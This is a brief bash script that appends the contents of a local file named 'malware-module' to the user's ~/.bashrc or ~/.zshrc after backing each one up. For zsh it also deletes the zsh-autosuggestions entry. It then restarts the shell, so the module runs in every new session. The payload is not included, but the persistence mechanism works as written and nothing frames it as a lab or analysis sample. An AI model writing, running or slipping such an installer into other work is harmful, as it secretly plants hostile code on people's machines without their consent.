#!/bin/bash

if [[ "$SHELL" == "/bin/bash" ]]; then
  cp ~/.bashrc ~/.bashrc.bak
  cat ./malware-module >> ~/.bashrc
  exec bash
elif [[ "$SHELL" == "/bin/zsh" ]]; then
  cp ~/.zshrc ~/.zshrc.bak
  sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
  cat ./malware-module >> ~/.zshrc
  exec zsh
fi

